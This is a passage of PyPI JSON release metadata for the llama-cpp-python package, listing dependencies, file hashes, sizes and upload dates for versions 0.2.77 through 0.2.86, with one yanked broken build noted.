\"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.77","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"9e60227e89f9fe92856e8009a2246b82561e9f4b9bf58d8ac755e19bf5da6ac9","md5":"34b6a65daeddcbb29633323aa3aee41d","sha256":"5d2f87df941a72ad6d122c3ffd91d8fe58542db350bd169c07b025d625a26803"},"downloads":-1,"filename":"llama_cpp_python-0.2.77.tar.gz","has_sig":false,"md5_digest":"34b6a65daeddcbb29633323aa3aee41d","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":50207513,"upload_time":"2024-06-04T04:52:11","upload_time_iso_8601":"2024-06-04T04:52:11.055618Z","url":"https://files.pythonhosted.org/packages/9e/60/227e89f9fe92856e8009a2246b82561e9f4b9bf58d8ac755e19bf5da6ac9/llama_cpp_python-0.2.77.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.78":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.78/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.78","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"f09ad8f8075fa25fd5774cc4fb40059e63517871ff3c676a50c66151bb071b96","md5":"d0e956468dd8ac32c958c1f406a83357","sha256":"3df7cfde84287faaf29675fba8939060c3ab3f0ce8db875dabf7df5d83bd8751"},"downloads":-1,"filename":"llama_cpp_python-0.2.78.tar.gz","has_sig":false,"md5_digest":"d0e956468dd8ac32c958c1f406a83357","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":50157794,"upload_time":"2024-06-10T15:17:15","upload_time_iso_8601":"2024-06-10T15:17:15.929947Z","url":"https://files.pythonhosted.org/packages/f0/9a/d8f8075fa25fd5774cc4fb40059e63517871ff3c676a50c66151bb071b96/llama_cpp_python-0.2.78.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.79":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":["server","test","dev","all"],"release_url":"https://pypi.org/project/llama-cpp-python/0.2.79/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.79","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"b6f2cb93a90e0d4fdb9eeb3a1d20bdc22b3ff59e7ab303a9634b8a6bef82d3cb","md5":"cedf64401388b239bc1d14401405cfe6","sha256":"19406225a37d816dc2fb911ba8e3ff2a48880dd79754820c55ed85ebc8238da4"},"downloads":-1,"filename":"llama_cpp_python-0.2.79.tar.gz","has_sig":false,"md5_digest":"cedf64401388b239bc1d14401405cfe6","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":50270925,"upload_time":"2024-06-19T14:12:38","upload_time_iso_8601":"2024-06-19T14:12:38.467088Z","url":"https://files.pythonhosted.org/packages/b6/f2/cb93a90e0d4fdb9eeb3a1d20bdc22b3ff59e7ab303a9634b8a6bef82d3cb/llama_cpp_python-0.2.79.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.8":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.8/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.8","yanked":true,"yanked_reason":"Broken  build"},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"6d60edbd982673a71c6c27fa6818914ad61c6171d165de4e777d489539f1d959","md5":"079fc5b5306c2770a3d646a9769c13d4","sha256":"ae7c07287a8ca1ab89ab4c234081a95531585280f862553108ea3667427325ec"},"downloads":-1,"filename":"llama_cpp_python-0.2.8.tar.gz","has_sig":false,"md5_digest":"079fc5b5306c2770a3d646a9769c13d4","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":1619982,"upload_time":"2023-09-30T00:10:19","upload_time_iso_8601":"2023-09-30T00:10:19.792373Z","url":"https://files.pythonhosted.org/packages/6d/60/edbd982673a71c6c27fa6818914ad61c6171d165de4e777d489539f1d959/llama_cpp_python-0.2.8.tar.gz","yanked":true,"yanked_reason":"Broken  build"}],"vulnerabilities":[]},"0.2.80":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":["server","test","dev","all"],"release_url":"https://pypi.org/project/llama-cpp-python/0.2.80/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.80","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"cfa06db5f7db78eb63019d5fa81047998cb2ecff27b8bbf4ba70a3ca4a3c3053","md5":"74815686032646f37a6b4a80c25c51d1","sha256":"20d6dbc21b508b4f0c8064b8ad671d80f5f3440505894bb4662efb236d99e73c"},"downloads":-1,"filename":"llama_cpp_python-0.2.80.tar.gz","has_sig":false,"md5_digest":"74815686032646f37a6b4a80c25c51d1","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":50405650,"upload_time":"2024-07-02T06:58:37","upload_time_iso_8601":"2024-07-02T06:58:37.850381Z","url":"https://files.pythonhosted.org/packages/cf/a0/6db5f7db78eb63019d5fa81047998cb2ecff27b8bbf4ba70a3ca4a3c3053/llama_cpp_python-0.2.80.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.81":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":["server","test","dev","all"],"release_url":"https://pypi.org/project/llama-cpp-python/0.2.81/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.81","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"188020834e766968ce923de7f24d57cdf06e21d15b569ff20cf98c46fc721f72","md5":"19b3eff9bbc266ac529a8e2a12f56876","sha256":"db875f243ffd56aa4b52d6aa02890a288bcf9ec28bbebf015be697b71845d43a"},"downloads":-1,"filename":"llama_cpp_python-0.2.81.tar.gz","has_sig":false,"md5_digest":"19b3eff9bbc266ac529a8e2a12f56876","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":50406885,"upload_time":"2024-07-02T16:05:31","upload_time_iso_8601":"2024-07-02T16:05:31.876238Z","url":"https://files.pythonhosted.org/packages/18/80/20834e766968ce923de7f24d57cdf06e21d15b569ff20cf98c46fc721f72/llama_cpp_python-0.2.81.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.82":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":["server","test","dev","all"],"release_url":"https://pypi.org/project/llama-cpp-python/0.2.82/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.82","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"e0e55be1c1dc3ec38571f7403543deeda16b52957c171b98bb1b5766461aa332","md5":"5b65703aa74d5192dc9bb4bee73bb90f","sha256":"55dbc02342bd128e12be7e6b59ba9f96a1bdb35a4e32b42694134970a6d96060"},"downloads":-1,"filename":"llama_cpp_python-0.2.82.tar.gz","has_sig":false,"md5_digest":"5b65703aa74d5192dc9bb4bee73bb90f","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":50679105,"upload_time":"2024-07-09T04:50:33","upload_time_iso_8601":"2024-07-09T04:50:33.082672Z","url":"https://files.pythonhosted.org/packages/e0/e5/5be1c1dc3ec38571f7403543deeda16b52957c171b98bb1b5766461aa332/llama_cpp_python-0.2.82.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.83":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":["server","test","dev","all"],"release_url":"https://pypi.org/project/llama-cpp-python/0.2.83/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.83","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"ae06515b8cd8f5965190bb229efc8013153beadb52b5db525b87fe46546fbc0e","md5":"0c79894f76baad90f171a1234a29bc97","sha256":"b08f070ce787959dcac635aaea93d14bde3b76347a5f8e8fc570735249f36e1c"},"downloads":-1,"filename":"llama_cpp_python-0.2.83.tar.gz","has_sig":false,"md5_digest":"0c79894f76baad90f171a1234a29bc97","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":49351840,"upload_time":"2024-07-22T19:28:20","upload_time_iso_8601":"2024-07-22T19:28:20.320099Z","url":"https://files.pythonhosted.org/packages/ae/06/515b8cd8f5965190bb229efc8013153beadb52b5db525b87fe46546fbc0e/llama_cpp_python-0.2.83.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.84":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":["server","test","dev","all"],"release_url":"https://pypi.org/project/llama-cpp-python/0.2.84/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.84","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"f2b54e1d9c25432be9abb00519c055550e6f3d3f8cb655fd17a2ceb73354cf14","md5":"96ad262ac81dc4e7c2013ffe4864649a","sha256":"51bfd2918fe92060c895a9d64455e7f6370b34e5496edfeaa3f0c17439f155fe"},"downloads":-1,"filename":"llama_cpp_python-0.2.84.tar.gz","has_sig":false,"md5_digest":"96ad262ac81dc4e7c2013ffe4864649a","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":49304809,"upload_time":"2024-07-28T16:08:55","upload_time_iso_8601":"2024-07-28T16:08:55.243050Z","url":"https://files.pythonhosted.org/packages/f2/b5/4e1d9c25432be9abb00519c055550e6f3d3f8cb655fd17a2ceb73354cf14/llama_cpp_python-0.2.84.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.85":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":["server","test","dev","all"],"release_url":"https://pypi.org/project/llama-cpp-python/0.2.85/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.85","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"7da83a63797e89bb11ce81a2305dfac0a2f0a3285add86c83c33e493db2b169a","md5":"b46d78627e075dd4c3d07a25895afb0d","sha256":"31476c2f4331784d3681f9bcd366cc4666ba97ab128bffbd23cb90ee2cebff21"},"downloads":-1,"filename":"llama_cpp_python-0.2.85.tar.gz","has_sig":false,"md5_digest":"b46d78627e075dd4c3d07a25895afb0d","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":49305965,"upload_time":"2024-07-31T16:26:38","upload_time_iso_8601":"2024-07-31T16:26:38.069076Z","url":"https://files.pythonhosted.org/packages/7d/a8/3a63797e89bb11ce81a2305dfac0a2f0a3285add86c83c33e493db2b169a/llama_cpp_python-0.2.85.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.86":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":["server","test","dev","all"],"release_url":"https://pypi.org/project/llama-cpp-python/0.2.86/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.86","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"990a2e8c3cf6ad514d9f2500a8628f1ee4a22f119f70a3ccd67915a8179cc56b","md5":"b3b8b5396f2d36d7118321435d0bd5f8","sha256":"343ffc9306149bcd1073f918bac5e8db7267e82dd7105353ca10c341be141d92"},"downloads":-1,"filename":"llama_cpp_python-0.2.86.tar.gz","has_sig":false,"md5_digest":"b3b8b5396f2d36d7118321435d0bd5f8","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":49307970,"upload_time":"2024-08-07T00:26:26","upload_time_iso_8601":"2024-08-07T00:26:26.733082Z","url":"https://files.pythonhosted.org/packages/99/0a/2e8c3cf6ad514d9f2500a8628f1ee4a22f119f70a3ccd67915a8179cc56b/llama_cpp_python-0.2.86.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.87":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 